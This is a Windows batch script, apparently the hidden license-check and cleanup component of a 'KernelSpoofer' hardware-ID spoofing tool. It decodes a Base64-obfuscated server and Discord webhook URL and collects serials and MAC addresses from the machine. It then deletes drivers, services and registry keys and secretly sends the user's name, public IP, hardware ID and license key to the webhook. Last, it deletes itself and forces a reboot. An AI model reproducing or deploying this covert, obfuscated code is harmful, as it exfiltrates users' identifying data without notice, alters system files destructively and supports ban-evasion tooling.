@echo off
setlocal EnableDelayedExpansion

:: ============================================================
:: KS_AutoCleaner.bat by @0ndw
:: Gorev zamanlayicida gizli calisir.
:: Lisans bittiyse her seyi temizler ve reboot atar.
:: ============================================================

:: BASE64 DECODE - endpoint gizli
for /f "delims=" %%X in ('powershell -c "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''aHR0cHM6Ly9qd29zdGltc3JtdGVvYmp4cXRleS5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvdmFsaWRhdGUtbGljZW5zZQ==''))"') do set _ep=%%X
for /f "delims=" %%X in ('powershell -c "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDE2NzIyNjk1NjMyMDkwOS9oWnN0VlZpSnpod3ZhNlphY3Nrd1ZpRUtIbDJ5c0Fhem5GVEViZk9EWnBINDc5MGIzNWsyUDY3VnM3WmQ4SUhqdkZjVg==''))"') do set _wh=%%X

set "_lc=C:\ProgramData\ks_license.dat"
set "_hc=C:\ProgramData\ks_hwid.dat"
set "_s32=C:\Windows\System32"

:: ============================================================
:: 1. CACHE VAR MI?
:: ============================================================
if not exist "!_lc!" goto :_CLEAN
set /p _cl=<"!_lc!"
set /p _ch=<"!_hc!"
if not defined _cl goto :_CLEAN

:: ============================================================
:: 2. INTERNET VAR MI?
:: ============================================================
ping -n 1 8.8.8.8 >nul 2>nul
if errorlevel 1 exit /b 0

:: ============================================================
:: 3. MULTI-HWID AL
:: ============================================================
for /f "tokens=2 delims==" %%i in ('wmic csproduct get uuid /value 2^>nul') do set _h1=%%i
for /f "tokens=2 delims==" %%i in ('wmic bios get serialnumber /value 2^>nul') do set _h2=%%i
for /f "tokens=2 delims==" %%i in ('wmic diskdrive get serialnumber /value 2^>nul') do set _h3=%%i
for /f "tokens=2 delims==" %%i in ('wmic baseboard get serialnumber /value 2^>nul') do set _h4=%%i
for /f "tokens=2 delims==" %%i in ('wmic nic where "PhysicalAdapter=True" get MACAddress /value 2^>nul') do set _h5=%%i
set _hwid=!_h1!-!_h2!-!_h3!-!_h4!-!_h5!

:: HWID degismis mi?
if not "!_ch!"=="!_hwid!" goto :_CLEAN

:: ============================================================
:: 4. SUNUCU DOGRULAMA
:: ============================================================
for /f "delims=" %%R in ('curl -s --max-time 10 -X POST "!_ep!" -H "Content-Type: application/json" -d "{\"license_key\":\"!_cl!\",\"hwid\":\"!_hwid!\"}"') do set _rs=%%R

echo !_rs! | findstr /i "active" >nul
if errorlevel 1 goto :_CLEAN

:: Kalan gun kontrolu
for /f "delims=" %%D in ('powershell -Command "try{$r=''!_rs!'';$j=$r|ConvertFrom-Json;$exp=[datetime]$j.license.expires_at;$days=($exp-(Get-Date)).Days;Write-Host $days}catch{Write-Host 999}"') do set _dl=%%D
if defined _dl (
    if !_dl! LEQ 0 goto :_CLEAN
)

:: Lisans gecerli - temiz cikis
exit /b 0

:: ============================================================
:_CLEAN
:: ============================================================
powershell -c "[console]::beep(300,500)"

:: [1] Servisleri durdur ve sil
sc stop system1   >nul 2>&1
sc stop system2   >nul 2>&1
sc stop system3   >nul 2>&1
timeout /t 2 /nobreak >nul
sc delete system1 >nul 2>&1
sc delete system2 >nul 2>&1
sc delete system3 >nul 2>&1

:: [2] Driverlari sil
attrib -s -h "!_s32!\drvcore.sys"   >nul 2>&1
attrib -s -h "!_s32!\netshim.sys"   >nul 2>&1
attrib -s -h "!_s32!\winverred.sys" >nul 2>&1
del /f /q "!_s32!\drvcore.sys"      >nul 2>&1
del /f /q "!_s32!\netshim.sys"      >nul 2>&1
del /f /q "!_s32!\winverred.sys"    >nul 2>&1
del /f /q "!_s32!\mac.exe"          >nul 2>&1

:: [3] Registry temizle
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\system1" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\system2" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\system3" /f >nul 2>&1
reg delete "HKCU\Software\KS_MUTEX_0ndw_2026"               /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "KernelSpoofer" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "KernelSpoofer" /f >nul 2>&1

:: [4] Cache temizle
del /f /q "C:\ProgramData\ks_license.dat" >nul 2>&1
del /f /q "C:\ProgramData\ks_hwid.dat"    >nul 2>&1
powershell -c "Remove-Item $env:TEMP\_x* -Force -ErrorAction SilentlyContinue" >nul 2>&1

:: [5] Gorev zamanlayiciyi sil
schtasks /delete /tn "KernelSpooferCleaner"       /f >nul 2>&1
schtasks /delete /tn "KernelSpooferCleanerRepeat" /f >nul 2>&1

:: [6] Webhook log
for /f "delims=" %%I in ('powershell -c "try{(Invoke-WebRequest -Uri ''https://api.ipify.org'' -UseBasicParsing).Content}catch{''unknown''}"') do set _ip=%%I
for /f "delims=" %%U in ('powershell -c "[System.Environment]::UserName"') do set _un=%%U
powershell -c "$wh='!_wh!';$body=@{username='KS Cleaner';embeds=@(@{title='[EXPIRED] Cleaned';color=15158332;fields=@(@{name='User';value='!_un!';inline=$true},@{name='IP';value='!_ip!';inline=$true},@{name='HWID';value='!_hwid!';inline=$false},@{name='License';value='!_cl!';inline=$false},@{name='Time';value=(Get-Date).ToString();inline=$true})})}|ConvertTo-Json -Depth 10;try{Invoke-WebRequest -Uri $wh -Method POST -Body $body -ContentType 'application/json' -UseBasicParsing}catch{}" >nul 2>nul

:: [7] Self delete + reboot
start /b "" cmd /c "timeout /t 3 >nul & del /f /q ""C:\ProgramData\KS_AutoCleaner.bat"""
shutdown /r /t 10
exit /b 0
